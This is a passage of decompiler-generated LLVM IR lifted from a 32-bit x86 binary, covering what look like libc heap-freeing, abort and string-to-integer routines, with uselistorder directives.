  %v3_8053a04 = icmp eq i8 %v2_8053a04, 0
  %v5_8053a04 = zext i8 %v2_8053a04 to i32
  %v7_8053a04 = and i32 %v3_80539d8, -256
  %v8_8053a04 = or i32 %v5_8053a04, %v7_8053a04
  store i32 %v8_8053a04, i32* @edx, align 4
  %v1_8053a07 = icmp eq i1 %v3_8053a04, false
  br i1 %v1_8053a07, label %dec_label_pc_8053afc, label %dec_label_pc_8053a0d

dec_label_pc_8053a0d:                             ; preds = %dec_label_pc_8053a04
  %v1_8053a0d = or i32 %v1_80539d0, 1
  %v3_8053a0d = trunc i32 %v1_8053a0d to i8
  store i32 %v1_8053a0d, i32* %eax.global-to-local, align 4
  %v2_8053a10 = add i32 %v1_80539dd, %v1_80539cd
  store i32 %v2_8053a10, i32* @esi, align 4
  store i8 %v3_8053a0d, i8* @global_var_8056c20.206, align 32
  %v1_8053a18 = add i32 %v2_8053a10, 4
  %v2_8053a18 = inttoptr i32 %v1_8053a18 to i32*
  %v3_8053a18 = load i32, i32* %v2_8053a18, align 4
  store i32 %v3_8053a18, i32* %eax.global-to-local, align 4
  %v2_8053a1f = inttoptr i32 %v1_80539d8 to i8*
  %v3_8053a1f = load i8, i8* %v2_8053a1f, align 1
  %v4_8053a1f = urem i8 %v3_8053a1f, 2
  %v5_8053a1f = icmp eq i8 %v4_8053a1f, 0
  %v1_8053a23 = icmp eq i1 %v5_8053a1f, false
  br i1 %v1_8053a23, label %dec_label_pc_8053a46, label %dec_label_pc_8053a25

dec_label_pc_8053a25:                             ; preds = %dec_label_pc_8053a0d
  %v2_8053a25 = inttoptr i32 %v1_80539cd to i32*
  %v3_8053a25 = load i32, i32* %v2_8053a25, align 4
  store i32 %v3_8053a25, i32* @ebp, align 4
  %v2_8053a2a = sub i32 %v1_80539cd, %v3_8053a25
  store i32 %v2_8053a2a, i32* %eax.global-to-local, align 4
  %v1_8053a2c = add i32 %v2_8053a2a, 8
  %v2_8053a2c = inttoptr i32 %v1_8053a2c to i32*
  %v3_8053a2c = load i32, i32* %v2_8053a2c, align 4
  store i32 %v3_8053a2c, i32* @edi, align 4
  %v1_8053a2f = add i32 %v2_8053a2a, 12
  %v2_8053a2f = inttoptr i32 %v1_8053a2f to i32*
  %v3_8053a2f = load i32, i32* %v2_8053a2f, align 4
  store i32 %v3_8053a2f, i32* @edx, align 4
  %v1_8053a32 = add i32 %v3_8053a2c, 12
  %v2_8053a32 = inttoptr i32 %v1_8053a32 to i32*
  %v3_8053a32 = load i32, i32* %v2_8053a32, align 4
  store i32 %v3_8053a32, i32* @ecx, align 4
  %v12_8053a35 = icmp eq i32 %v3_8053a32, %v2_8053a2a
  %v1_8053a37 = icmp eq i1 %v12_8053a35, false
  br i1 %v1_8053a37, label %dec_label_pc_8053a75, label %dec_label_pc_8053a39

dec_label_pc_8053a39:                             ; preds = %dec_label_pc_8053a25
  %v1_8053a39 = add i32 %v3_8053a2f, 8
  %v2_8053a39 = inttoptr i32 %v1_8053a39 to i32*
  %v3_8053a39 = load i32, i32* %v2_8053a39, align 4
  %v15_8053a39 = icmp eq i32 %v3_8053a39, %v3_8053a32
  %v1_8053a3c = icmp eq i1 %v15_8053a39, false
  br i1 %v1_8053a3c, label %dec_label_pc_8053a75, label %dec_label_pc_8053a3e

dec_label_pc_8053a3e:                             ; preds = %dec_label_pc_8053a39
  %v2_8053a3e = add i32 %v3_8053a25, %v1_80539dd
  store i32 %v2_8053a3e, i32* @ebx, align 4
  store i32 %v3_8053a2f, i32* %v2_8053a32, align 4
  %v0_8053a43 = load i32, i32* @edi, align 4
  %v1_8053a43 = load i32, i32* @edx, align 4
  %v2_8053a43 = add i32 %v1_8053a43, 8
  %v3_8053a43 = inttoptr i32 %v2_8053a43 to i32*
  store i32 %v0_8053a43, i32* %v3_8053a43, align 4
  %v0_8053a4d.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8053a46

dec_label_pc_8053a46:                             ; preds = %dec_label_pc_8053a0d, %dec_label_pc_8053a3e
  %v1_8053a59 = phi i32 [ %v2_8053a10, %dec_label_pc_8053a0d ], [ %v0_8053a4d.pre, %dec_label_pc_8053a3e ]
  %v1_8053a4a = and i32 %v3_8053a18, -4
  store i32 %v1_8053a4a, i32* @ebp, align 4
  %v1_8053a4d = load i32, i32* @global_var_8056c4c.207, align 4
  %v12_8053a4d = icmp eq i32 %v1_8053a59, %v1_8053a4d
  br i1 %v12_8053a4d, label %dec_label_pc_8053aa7, label %dec_label_pc_8053a55

dec_label_pc_8053a55:                             ; preds = %dec_label_pc_8053a46
  %v2_8053a55 = add i32 %v1_8053a59, 4
  %v3_8053a55 = add i32 %v2_8053a55, %v1_8053a4a
  %v4_8053a55 = inttoptr i32 %v3_8053a55 to i32*
  %v5_8053a55 = load i32, i32* %v4_8053a55, align 4
  store i32 %v5_8053a55, i32* %eax.global-to-local, align 4
  %v3_8053a59 = inttoptr i32 %v2_8053a55 to i32*
  store i32 %v1_8053a4a, i32* %v3_8053a59, align 4
  %v0_8053a5c = load i32, i32* %eax.global-to-local, align 4
  %v1_8053a5c = urem i32 %v0_8053a5c, 2
  %v2_8053a5c = icmp eq i32 %v1_8053a5c, 0
  store i32 %v1_8053a5c, i32* %eax.global-to-local, align 4
  %v1_8053a61 = icmp eq i1 %v2_8053a5c, false
  br i1 %v1_8053a61, label %dec_label_pc_8053a82, label %dec_label_pc_8053a63

dec_label_pc_8053a63:                             ; preds = %dec_label_pc_8053a55
  %v0_8053a63 = load i32, i32* @esi, align 4
  %v1_8053a63 = add i32 %v0_8053a63, 8
  %v2_8053a63 = inttoptr i32 %v1_8053a63 to i32*
  %v3_8053a63 = load i32, i32* %v2_8053a63, align 4
  store i32 %v3_8053a63, i32* @edx, align 4
  %v1_8053a66 = add i32 %v0_8053a63, 12
  %v2_8053a66 = inttoptr i32 %v1_8053a66 to i32*
  %v3_8053a66 = load i32, i32* %v2_8053a66, align 4
  store i32 %v3_8053a66, i32* %eax.global-to-local, align 4
  %v1_8053a69 = add i32 %v3_8053a63, 12
  %v2_8053a69 = inttoptr i32 %v1_8053a69 to i32*
  %v3_8053a69 = load i32, i32* %v2_8053a69, align 4
  store i32 %v3_8053a69, i32* @edi, align 4
  %v12_8053a6c = icmp eq i32 %v3_8053a69, %v0_8053a63
  %v1_8053a6e = icmp eq i1 %v12_8053a6c, false
  br i1 %v1_8053a6e, label %dec_label_pc_8053a75, label %dec_label_pc_8053a70

dec_label_pc_8053a70:                             ; preds = %dec_label_pc_8053a63
  %v1_8053a70 = add i32 %v3_8053a66, 8
  %v2_8053a70 = inttoptr i32 %v1_8053a70 to i32*
  %v3_8053a70 = load i32, i32* %v2_8053a70, align 4
  %v15_8053a70 = icmp eq i32 %v3_8053a70, %v3_8053a69
  br i1 %v15_8053a70, label %dec_label_pc_8053a7a, label %dec_label_pc_8053a75

dec_label_pc_8053a75:                             ; preds = %dec_label_pc_8053a70, %dec_label_pc_8053a63, %dec_label_pc_8053a39, %dec_label_pc_8053a25
  %v0_8053a75 = call i32 @function_8053b35()
  store i32 %v0_8053a75, i32* %eax.global-to-local, align 4
  %v1_8053a7a.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8053a7a

dec_label_pc_8053a7a:                             ; preds = %dec_label_pc_8053a70, %dec_label_pc_8053a75
  %v1_8053a7a = phi i32 [ %v3_8053a63, %dec_label_pc_8053a70 ], [ %v1_8053a7a.pre, %dec_label_pc_8053a75 ]
  %v0_8053a7a = phi i32 [ %v3_8053a66, %dec_label_pc_8053a70 ], [ %v0_8053a75, %dec_label_pc_8053a75 ]
  %v2_8053a7a = add i32 %v1_8053a7a, 12
  %v3_8053a7a = inttoptr i32 %v2_8053a7a to i32*
  store i32 %v0_8053a7a, i32* %v3_8053a7a, align 4
  %v0_8053a7d = load i32, i32* @edx, align 4
  %v1_8053a7d = load i32, i32* %eax.global-to-local, align 4
  %v2_8053a7d = add i32 %v1_8053a7d, 8
  %v3_8053a7d = inttoptr i32 %v2_8053a7d to i32*
  store i32 %v0_8053a7d, i32* %v3_8053a7d, align 4
  %v0_8053a80 = load i32, i32* @ebx, align 4
  %v1_8053a80 = load i32, i32* @ebp, align 4
  %v2_8053a80 = add i32 %v1_8053a80, %v0_8053a80
  store i32 %v2_8053a80, i32* @ebx, align 4
  br label %dec_label_pc_8053a82

dec_label_pc_8053a82:                             ; preds = %dec_label_pc_8053a55, %dec_label_pc_8053a7a
  %v0_8053a82 = load i32, i32* @global_var_8056c5c.225, align 4
  store i32 %v0_8053a82, i32* %eax.global-to-local, align 4
  %v0_8053a87 = load i32, i32* @ecx, align 4
  %v1_8053a87 = add i32 %v0_8053a87, 12
  %v2_8053a87 = inttoptr i32 %v1_8053a87 to i32*
  store i32 ptrtoint (i32* @global_var_8056c54.209 to i32), i32* %v2_8053a87, align 4
  %v0_8053a8e = load i32, i32* %eax.global-to-local, align 4
  %v1_8053a8e = load i32, i32* @ecx, align 4
  %v2_8053a8e = add i32 %v1_8053a8e, 8
  %v3_8053a8e = inttoptr i32 %v2_8053a8e to i32*
  store i32 %v0_8053a8e, i32* %v3_8053a8e, align 4
  %v0_8053a91 = load i32, i32* @ebx, align 4
  %v1_8053a91 = load i32, i32* @ecx, align 4
  %v3_8053a91 = add i32 %v1_8053a91, %v0_8053a91
  %v4_8053a91 = inttoptr i32 %v3_8053a91 to i32*
  store i32 %v0_8053a91, i32* %v4_8053a91, align 4
  %v0_8053a94 = load i32, i32* @ecx, align 4
  %v1_8053a94 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053a94 = add i32 %v1_8053a94, 12
  %v3_8053a94 = inttoptr i32 %v2_8053a94 to i32*
  store i32 %v0_8053a94, i32* %v3_8053a94, align 4
  %v0_8053a97 = load i32, i32* @ebx, align 4
  %v1_8053a99 = or i32 %v0_8053a97, 1
  store i32 %v1_8053a99, i32* %eax.global-to-local, align 4
  %v0_8053a9c = load i32, i32* @ecx, align 4
  store i32 %v0_8053a9c, i32* @global_var_8056c5c.225, align 4
  %v2_8053aa2 = add i32 %v0_8053a9c, 4
  %v3_8053aa2 = inttoptr i32 %v2_8053aa2 to i32*
  store i32 %v1_8053a99, i32* %v3_8053aa2, align 4
  br label %dec_label_pc_8053ab7

dec_label_pc_8053aa7:                             ; preds = %dec_label_pc_8053a46
  %v0_8053aa7 = load i32, i32* @ebx, align 4
  %v2_8053aa7 = add i32 %v0_8053aa7, %v1_8053a4a
  store i32 %v2_8053aa7, i32* @ebx, align 4
  %v1_8053aab = or i32 %v2_8053aa7, 1
  store i32 %v1_8053aab, i32* %eax.global-to-local, align 4
  %v1_8053aae = load i32, i32* @ecx, align 4
  %v2_8053aae = add i32 %v1_8053aae, 4
  %v3_8053aae = inttoptr i32 %v2_8053aae to i32*
  store i32 %v1_8053aab, i32* %v3_8053aae, align 4
  %v0_8053ab1 = load i32, i32* @ecx, align 4
  store i32 %v0_8053ab1, i32* @global_var_8056c4c.207, align 4
  br label %dec_label_pc_8053ab7

dec_label_pc_8053ab7:                             ; preds = %dec_label_pc_8053a82, %dec_label_pc_8053aa7
  %v0_8053ab7 = load i32, i32* @ebx, align 4
  %tmp21 = icmp ult i32 %v0_8053ab7, 131072
  br i1 %tmp21, label %dec_label_pc_8053b1c, label %dec_label_pc_8053abf

dec_label_pc_8053abf:                             ; preds = %dec_label_pc_8053ab7
  %v0_8053abf = load i8, i8* @global_var_8056c20.206, align 32
  %v1_8053abf = and i8 %v0_8053abf, 2
  %v2_8053abf = icmp eq i8 %v1_8053abf, 0
  br i1 %v2_8053abf, label %dec_label_pc_8053ad8, label %dec_label_pc_8053ac8

dec_label_pc_8053ac8:                             ; preds = %dec_label_pc_8053abf
  %v2_8053ad0 = call i32 @function_80537f1(i32* bitcast (i8* @global_var_8056c20.206 to i32*))
  store i32 %v2_8053ad0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053ad8

dec_label_pc_8053ad8:                             ; preds = %dec_label_pc_8053abf, %dec_label_pc_8053ac8
  %v0_8053ad8 = load i32, i32* @global_var_8056c4c.207, align 4
  store i32 %v0_8053ad8, i32* %eax.global-to-local, align 4
  %v1_8053add = add i32 %v0_8053ad8, 4
  %v2_8053add = inttoptr i32 %v1_8053add to i32*
  %v3_8053add = load i32, i32* %v2_8053add, align 4
  %v1_8053ae0 = and i32 %v3_8053add, -4
  store i32 %v1_8053ae0, i32* %eax.global-to-local, align 4
  %v1_8053ae3 = load i32, i32* @global_var_8056f64.223, align 4
  %v7_8053ae3 = icmp ult i32 %v1_8053ae0, %v1_8053ae3
  br i1 %v7_8053ae3, label %dec_label_pc_8053b1c, label %dec_label_pc_8053aeb

dec_label_pc_8053aeb:                             ; preds = %dec_label_pc_8053ad8
  store i32 ptrtoint (i8* @global_var_8056c20.206 to i32), i32* @edx, align 4
  %v0_8053af0 = load i32, i32* @global_var_8056f68.221, align 8
  store i32 %v0_8053af0, i32* @eax, align 4
  %v0_8053af5 = call i32 @function_8053764()
  store i32 %v0_8053af5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053b1c

dec_label_pc_8053afc:                             ; preds = %dec_label_pc_8053a04
  %v2_8053afc = inttoptr i32 %v1_80539cd to i32*
  %v3_8053afc = load i32, i32* %v2_8053afc, align 4
  %v0_8053aff = load i32, i32* @global_var_8056f70.214, align 16
  %v1_8053aff = add i32 %v0_8053aff, -1
  store i32 %v1_8053aff, i32* @global_var_8056f70.214, align 16
  %v2_8053b05 = add i32 %v3_8053afc, %v1_80539dd
  store i32 %v2_8053b05, i32* %eax.global-to-local, align 4
  %v2_8053b08 = sub i32 %v1_80539cd, %v3_8053afc
  %v0_8053b0e = load i32, i32* @global_var_8056f84.217, align 4
  %v2_8053b0e = sub i32 %v0_8053b0e, %v2_8053b05
  store i32 %v2_8053b0e, i32* @global_var_8056f84.217, align 4
  %v4_8053b14 = inttoptr i32 %v2_8053b08 to i32*
  %v5_8053b14 = call i32 @function_8054865(i32* %v4_8053b14, i32 %v2_8053b05, i32 %v1_80539dd, i32 %v1_80539dd)
  store i32 %v5_8053b14, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053b1c

dec_label_pc_8053b1c:                             ; preds = %dec_label_pc_8053ad8, %dec_label_pc_8053ab7, %dec_label_pc_8053aeb, %dec_label_pc_80539e4, %dec_label_pc_8053afc
  store i32 %v2_80539b7, i32* @eax, align 4
  %v2_8053b25 = call i32 @function_8054100(i32 %v2_80539b7, i32 1)
  store i32 %v2_8053b25, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053b2d

dec_label_pc_8053b2d:                             ; preds = %dec_label_pc_8053999, %dec_label_pc_8053b1c
  %.0 = phi i32 [ undef, %dec_label_pc_8053999 ], [ %v2_8053b25, %dec_label_pc_8053b1c ]
  store i32 %v0_805399c, i32* @ebx, align 4
  store i32 %v0_805399b, i32* @esi, align 4
  store i32 %v0_805399a, i32* @edi, align 4
  store i32 %v0_8053999, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_8053afc, { 1, 0 }
  uselistorder i32 %v0_8053a91, { 1, 0 }
  uselistorder i32 %v1_8053a5c, { 1, 0 }
  uselistorder i32 %v2_8053a55, { 1, 0 }
  uselistorder i32 %v1_8053a4a, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8053a59, { 1, 0 }
  uselistorder i32 %v1_80539dd, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v3_80539d8, { 1, 2, 0, 3 }
  uselistorder i32 %v1_80539cd, { 1, 4, 2, 3, 0, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 11, 14, 15, 12, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* bitcast (i8* @global_var_8056c20.206 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_8056c54.209 to i32), { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32* @global_var_8056c4c.207, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32 ptrtoint (i8* @global_var_8056c20.206 to i32), { 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder i8* @global_var_8056c20.206, { 4, 7, 6, 5, 3, 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_8056880.205 to i32), { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 %arg1, { 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_8053b2d, { 1, 0 }
  uselistorder label %dec_label_pc_8053b1c, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8053ad8, { 1, 0 }
  uselistorder label %dec_label_pc_8053ab7, { 1, 0 }
  uselistorder label %dec_label_pc_8053a82, { 1, 0 }
  uselistorder label %dec_label_pc_8053a7a, { 1, 0 }
  uselistorder label %dec_label_pc_8053a46, { 1, 0 }
}

define i32 @function_8053b35() local_unnamed_addr {
dec_label_pc_8053b50.lr.ph:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %v1_8053b41 = call i32 @function_80540fd(i32 ptrtoint (i32* @global_var_8056898.226 to i32))
  %v12_8053b4b = ptrtoint i32* %stack_var_-284 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_8053b5048 = add i32 %v12_8053b4b, 276
  %v5_8053b5049 = inttoptr i32 %v4_8053b5048 to i32*
  store i32 0, i32* %v5_8053b5049, align 4
  %v0_8053b5b50 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053b5b51 = add i32 %v0_8053b5b50, -1
  %v9_8053b5b52 = icmp slt i32 %v1_8053b5b51, 0
  store i32 %v1_8053b5b51, i32* %eax.global-to-local, align 4
  %v1_8053b5c53 = icmp eq i1 %v9_8053b5b52, false
  br i1 %v1_8053b5c53, label %dec_label_pc_8053b50.dec_label_pc_8053b50_crit_edge, label %dec_label_pc_8053b5e

dec_label_pc_8053b50.dec_label_pc_8053b50_crit_edge: ; preds = %dec_label_pc_8053b50.lr.ph, %dec_label_pc_8053b50.dec_label_pc_8053b50_crit_edge
  %v1_8053b5b54 = phi i32 [ %v1_8053b5b, %dec_label_pc_8053b50.dec_label_pc_8053b50_crit_edge ], [ %v1_8053b5b51, %dec_label_pc_8053b50.lr.ph ]
  %v0_8053b50.pre = load i32, i32* @esp, align 4
  %v2_8053b50 = mul i32 %v1_8053b5b54, 4
  %v3_8053b50 = add i32 %v0_8053b50.pre, 152
  %v4_8053b50 = add i32 %v3_8053b50, %v2_8053b50
  %v5_8053b50 = inttoptr i32 %v4_8053b50 to i32*
  store i32 0, i32* %v5_8053b50, align 4
  %v0_8053b5b = load i32, i32* %eax.global-to-local, align 4
  %v1_8053b5b = add i32 %v0_8053b5b, -1
  %v9_8053b5b = icmp slt i32 %v1_8053b5b, 0
  store i32 %v1_8053b5b, i32* %eax.global-to-local, align 4
  %v1_8053b5c = icmp eq i1 %v9_8053b5b, false
  br i1 %v1_8053b5c, label %dec_label_pc_8053b50.dec_label_pc_8053b50_crit_edge, label %dec_label_pc_8053b5e

dec_label_pc_8053b5e:                             ; preds = %dec_label_pc_8053b50.dec_label_pc_8053b50_crit_edge, %dec_label_pc_8053b50.lr.ph
  %v0_8053b5e = load i32, i32* @ebx, align 4
  %v2_8053b62 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_8053b62, i32* @ebx, align 4
  %v4_8053b6a = call i32 @function_8052b8e(i32 %v2_8053b62, i32 6, i32 %v0_8053b5e, i32 %v0_8053b5e)
  store i32 %v4_8053b6a, i32* %eax.global-to-local, align 4
  %v1_8053b72 = icmp eq i32 %v4_8053b6a, 0
  %v1_8053b74 = icmp eq i1 %v1_8053b72, false
  br i1 %v1_8053b74, label %dec_label_pc_8053b84, label %dec_label_pc_8053b76

dec_label_pc_8053b76:                             ; preds = %dec_label_pc_8053b5e
  %v3_8053b7c = bitcast i32* %stack_var_-132 to %_TYPEDEF_sigset_t*
  %v4_8053b7c = call i32 @function_80524ad(i32 1, %_TYPEDEF_sigset_t* %v3_8053b7c, i32 0)
  store i32 %v4_8053b7c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053b84

dec_label_pc_8053b84:                             ; preds = %dec_label_pc_8053b5e, %dec_label_pc_8053b76
  %v2_8053bbc23 = phi i32 [ %v4_8053b6a, %dec_label_pc_8053b5e ], [ %v4_8053b7c, %dec_label_pc_8053b76 ]
  %v0_8053b84 = load i8, i8* @global_var_8056994.227, align 4
  %v1_8053b84 = icmp eq i8 %v0_8053b84, 0
  %v1_8053b8b = icmp eq i1 %v1_8053b84, false
  br i1 %v1_8053b8b, label %dec_label_pc_8053bbc, label %dec_label_pc_8053b8d

dec_label_pc_8053b8d:                             ; preds = %dec_label_pc_8053b84
  store i8 1, i8* @global_var_8056994.227, align 4
  br label %dec_label_pc_8053b94

dec_label_pc_8053b94:                             ; preds = %dec_label_pc_8053bfb, %dec_label_pc_8053b8d
  %v1_8053b9c = call i32 @function_80540fd(i32 ptrtoint (i32* @global_var_8056898.226 to i32))
  store i32 %v1_8053b9c, i32* %eax.global-to-local, align 4
  %v1_8053ba8 = call i32 @function_8052a60(i32 6)
  store i32 %v1_8053ba8, i32* %eax.global-to-local, align 4
  %v1_8053bb4 = call i32 @function_80540fd(i32 ptrtoint (i32* @global_var_8056898.226 to i32))
  store i32 %v1_8053bb4, i32* %eax.global-to-local, align 4
  %v0_8053bbc.pre = load i8, i8* @global_var_8056994.227, align 4
  br label %dec_label_pc_8053bbc

dec_label_pc_8053bbc:                             ; preds = %dec_label_pc_8053b84, %dec_label_pc_8053b94
  %v2_8053bbc = phi i32 [ %v2_8053bbc23, %dec_label_pc_8053b84 ], [ %v1_8053bb4, %dec_label_pc_8053b94 ]
  %v0_8053bbc = phi i8 [ %v0_8053b84, %dec_label_pc_8053b84 ], [ %v0_8053bbc.pre, %dec_label_pc_8053b94 ]
  %v1_8053bbc = zext i8 %v0_8053bbc to i32
  %v3_8053bbc = and i32 %v2_8053bbc, -256
  %v4_8053bbc = or i32 %v1_8053bbc, %v3_8053bbc
  store i32 %v4_8053bbc, i32* %eax.global-to-local, align 4
  %v10_8053bc1 = icmp eq i8 %v0_8053bbc, 1
  %v1_8053bc3 = icmp eq i1 %v10_8053bc1, false
  br i1 %v1_8053bc3, label %dec_label_pc_8053c1d, label %dec_label_pc_8053bf0.lr.ph

dec_label_pc_8053bf0.lr.ph:                       ; preds = %dec_label_pc_8053bbc
  store i8 2, i8* @global_var_8056994.227, align 4
  %v2_8053bd4 = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_8053bd4, i32* %eax.global-to-local, align 4
  %v3_8053bd9 = bitcast i32* %stack_var_-272 to i8*
  %v4_8053bd9 = call i32 @function_80527ca(i8* %v3_8053bd9, i32 0, i32 140)
  store i32 0, i32* %stack_var_-272, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_8053bf040 = add i32 %v12_8053b4b, 140
  %v5_8053bf041 = inttoptr i32 %v4_8053bf040 to i32*
  store i32 -1, i32* %v5_8053bf041, align 4
  %v0_8053bf842 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053bf843 = add i32 %v0_8053bf842, -1
  %v9_8053bf844 = icmp slt i32 %v1_8053bf843, 0
  store i32 %v1_8053bf843, i32* %eax.global-to-local, align 4
  %v1_8053bf945 = icmp eq i1 %v9_8053bf844, false
  br i1 %v1_8053bf945, label %dec_label_pc_8053bf0.dec_label_pc_8053bf0_crit_edge, label %dec_label_pc_8053bfb

dec_label_pc_8053bf0.dec_label_pc_8053bf0_crit_edge: ; preds = %dec_label_pc_8053bf0.lr.ph, %dec_label_pc_8053bf0.dec_label_pc_8053bf0_crit_edge
  %v1_8053bf846 = phi i32 [ %v1_8053bf8, %dec_label_pc_8053bf0.dec_label_pc_8053bf0_crit_edge ], [ %v1_8053bf843, %dec_label_pc_8053bf0.lr.ph ]
  %v0_8053bf0.pre = load i32, i32* @esp, align 4
  %v2_8053bf0 = mul i32 %v1_8053bf846, 4
  %v3_8053bf0 = add i32 %v0_8053bf0.pre, 16
  %v4_8053bf0 = add i32 %v3_8053bf0, %v2_8053bf0
  %v5_8053bf0 = inttoptr i32 %v4_8053bf0 to i32*
  store i32 -1, i32* %v5_8053bf0, align 4
  %v0_8053bf8 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053bf8 = add i32 %v0_8053bf8, -1
  %v9_8053bf8 = icmp slt i32 %v1_8053bf8, 0
  store i32 %v1_8053bf8, i32* %eax.global-to-local, align 4
  %v1_8053bf9 = icmp eq i1 %v9_8053bf8, false
  br i1 %v1_8053bf9, label %dec_label_pc_8053bf0.dec_label_pc_8053bf0_crit_edge, label %dec_label_pc_8053bfb

dec_label_pc_8053bfb:                             ; preds = %dec_label_pc_8053bf0.dec_label_pc_8053bf0_crit_edge, %dec_label_pc_8053bf0.lr.ph
  store i32 %v2_8053bd4, i32* %eax.global-to-local, align 4
  %v4_8053c10 = call i32 @function_805433f(i32 6, i32* nonnull %stack_var_-272, i32 0)
  store i32 %v4_8053c10, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053b94

dec_label_pc_8053c1d:                             ; preds = %dec_label_pc_8053bbc
  %v10_8053c1d = icmp eq i8 %v0_8053bbc, 2
  %v1_8053c1f = icmp eq i1 %v10_8053c1d, false
  br i1 %v1_8053c1f, label %dec_label_pc_8053c29, label %dec_label_pc_8053c29.thread

dec_label_pc_8053c29.thread:                      ; preds = %dec_label_pc_8053c1d
  store i8 3, i8* @global_var_8056994.227, align 4
  br label %dec_label_pc_8053c32

dec_label_pc_8053c29:                             ; preds = %dec_label_pc_8053c1d
  %v9_8053c29 = icmp eq i8 %v0_8053bbc, 3
  %v1_8053c30 = icmp eq i1 %v9_8053c29, false
  br i1 %v1_8053c30, label %dec_label_pc_8053c43, label %dec_label_pc_8053c32

dec_label_pc_8053c32:                             ; preds = %dec_label_pc_8053c29.thread, %dec_label_pc_8053c29
  store i8 4, i8* @global_var_8056994.227, align 4
  %v1_8053c3e = call i32 @function_80544a0(i32 127)
  unreachable

dec_label_pc_8053c43:                             ; preds = %dec_label_pc_8053c29, %dec_label_pc_8053c43
  br label %dec_label_pc_8053c43

; uselistorder directives
  uselistorder i32 %v1_8053bf8, { 2, 1, 0 }
  uselistorder i32 %v1_8053b5b, { 2, 1, 0 }
  uselistorder i32* %stack_var_-272, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 15, 16, 11, 12, 3, 4, 5, 6, 7, 8, 9, 10, 17, 18, 13, 14 }
  uselistorder i8 3, { 0, 4, 1, 2, 3 }
  uselistorder i8 2, { 8, 11, 12, 1, 13, 2, 3, 4, 5, 6, 14, 15, 7, 0, 10, 16, 9 }
  uselistorder i8* @global_var_8056994.227, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8053c43, { 1, 0 }
  uselistorder label %dec_label_pc_8053c32, { 1, 0 }
  uselistorder label %dec_label_pc_8053bf0.dec_label_pc_8053bf0_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_8053bbc, { 1, 0 }
  uselistorder label %dec_label_pc_8053b84, { 1, 0 }
  uselistorder label %dec_label_pc_8053b50.dec_label_pc_8053b50_crit_edge, { 1, 0 }
}

define i32 @function_8053c46() local_unnamed_addr {
dec_label_pc_8053c46:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v3_8053c51 = call i32 @function_8053c5a(i32 %tmp, i32 0, i32 10)
  ret i32 %v3_8053c51
}

define i32 @function_8053c5a(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8053c5a:
  %v4_8053c6b = inttoptr i32 %arg1 to i8*
  %v5_8053c6b = call i32 @function_8053c74(i8* %v4_8053c6b, i32 %arg2, i32 %arg3, i32 1)
  ret i32 %v5_8053c6b
}

define i32 @function_8053c74(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8053c74:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = trunc i32 %arg4 to i8
  %tmp42 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-16 = alloca i32, align 4
  %v0_8053c77 = load i32, i32* @ebx, align 4
  store i32 %v0_8053c77, i32* %stack_var_-16, align 4
  %v0_8053c7b = load i32, i32* bitcast (i32** @global_var_80568cc.229 to i32*), align 4
  store i32 %v0_8053c7b, i32* %edx.global-to-local, align 4
  %v4_8053c81 = ptrtoint i8* %arg1 to i32
  store i32 %arg3, i32* %esi.global-to-local, align 4
  store i32 %v4_8053c81, i32* %ebx.global-to-local, align 4
  %v2_8053c8e8 = load i8, i8* %arg1, align 1
  %v3_8053c8e9 = sext i8 %v2_8053c8e8 to i32
  store i32 %v3_8053c8e9, i32* %eax.global-to-local, align 4
  %v2_8053c9111 = mul nsw i32 %v3_8053c8e9, 2
  %v3_8053c9112 = add i32 %v2_8053c9111, %v0_8053c7b
  %v4_8053c9113 = inttoptr i32 %v3_8053c9112 to i8*
  %v5_8053c9114 = load i8, i8* %v4_8053c9113, align 1
  %v6_8053c9115 = and i8 %v5_8053c9114, 32
  %v7_8053c9116 = icmp eq i8 %v6_8053c9115, 0
  %v1_8053c9517 = icmp eq i1 %v7_8053c9116, false
  br i1 %v1_8053c9517, label %dec_label_pc_8053c8d, label %dec_label_pc_8053c97

